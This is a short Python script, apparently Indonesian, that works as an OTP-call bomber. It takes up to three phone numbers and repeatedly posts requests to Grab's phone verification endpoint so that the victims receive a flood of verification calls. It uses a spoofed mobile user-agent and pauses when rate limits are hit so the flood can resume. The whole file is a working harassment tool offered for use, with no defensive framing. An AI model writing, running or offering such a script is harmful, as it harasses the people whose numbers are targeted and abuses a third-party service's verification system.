try:
	import os, requests, time, json
except ModuleNotFoundError:
	print("\n requests")
	exit()
os.system('clear')
c=('\033[1;36m')
r=('\033[1;31m')
g=('\033[1;32m')
w=('\033[1;37m')
print("##################################")
print("Creator @Mr.Ti")
no = input(" Nomer Hp 62  ")
noo = input(" Nomer Hp 62  ")
nooo = input(" Nomer Hp 62  ")
delay=int(input(" Delay ne Bro => "))

try:
	henti_tanya=False
	forcecon=0
	print("\n%s SMK Telkom Malang %s"%(r,w));time.sleep(1)
	for i in range(delay):
		cout=1
		print(f"{'{'}{i+1}{'}'}"+"="*40+f"{'{'}{i+1}{'}'}")
		for i in no,noo,nooo:
			if i == '':
				cout+=1
				continue
			dt={'method':'CALL','countryCode':'id','phoneNumber':i,'templateID':'pax_android_production'}
			r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt,headers={'user-agent':'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6264; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36'})

			if "10074" in r1.text:
				print(f" {r} {cout}{w} Limit bruh ")
				if henti_tanya == True:
					pass
				else:
					pil=input(" Delay di jeda 60 detik bruh , y ")
					if pil.lower() == 'y':
						for x in range(60):
							try:
								print(end=f"\r Jeda {60-(x+1)} detik",flush=True)
								time.sleep(1)
							except: break
						print("\n Skuy ")
					elif pil.lower() == 'f':
						henti_tanya=True
					else:
						forcecon+=1
						if forcecon >= 3:
							print(f" {c}f{w}")
			elif "challengeID" in r1.text:
				print(f" {c} {cout} {g}[][][][][][][][][][][]:: Terkirim bos ku ::[][][][][][][][][][][]{w}")
			else:
				print(f" {c} {cout} {r}[][][][][][][][][][][]:: Gagal bos ku ::[][][][][][][][][][][]{w}")
			time.sleep(10)
			cout+=1
	print("{end}"+"="*40+"{end}")
except KeyboardInterrupt:
	print("\n%sBUBAR BUBAR")